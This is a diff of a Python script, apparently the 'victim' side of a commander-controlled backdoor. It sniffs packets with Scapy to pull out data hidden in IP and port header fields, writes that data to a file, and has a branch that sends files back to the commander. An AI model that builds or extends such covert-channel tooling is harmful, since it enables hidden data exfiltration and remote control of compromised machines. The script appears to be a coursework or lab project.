@@ -249,16 +249,20 @@ if __name__ == '__main__':
                         binary_data = selected_function(packet)
                         return binary_data
 
-                    # DIFFERENT SNIFF: If choice is covert with IPv4/source IP address
+                    # DIFFERENT SNIFFS: If choice is covert with (IPv4/source_ip)
                     if constants.SOURCE_ADDRESS_FIELD in choices:
-                        received_packets = sniff(filter="src host {} or dst port {}".format(client_address[0],
-                                                                                            source_port), count=count)
+                        received_packets = sniff(filter="dst port {}".format(source_port), count=count)
+                    elif constants.DESTINATION_ADDRESS_FIELD in choices:
+                        print(constants.FILE_TRANSFER_UNSUCCESSFUL)
+                        break
                     else:  # REGULAR SNIFF
                         received_packets = sniff(filter="src host {}".format(client_address[0]), count=count)
 
-                    # Extract Data -> Convert from Binary to Text -> write to file
+                    # Extract Data
                     extracted_data = ''.join(packet_callback(packet)
                                              for packet in received_packets if packet_callback(packet))
+
+                    # Write Data to File
                     covert_data_write_to_file(extracted_data, filename)
 
                     # Send ACK to commander (if good)
@@ -267,6 +271,8 @@ if __name__ == '__main__':
                         client_socket.send(constants.VICTIM_ACK.encode())
                     else:
                         client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
+
+
 
                 # f) Transfer file to Commander
                 if data.decode() == constants.GET_FILE_SIGNAL:
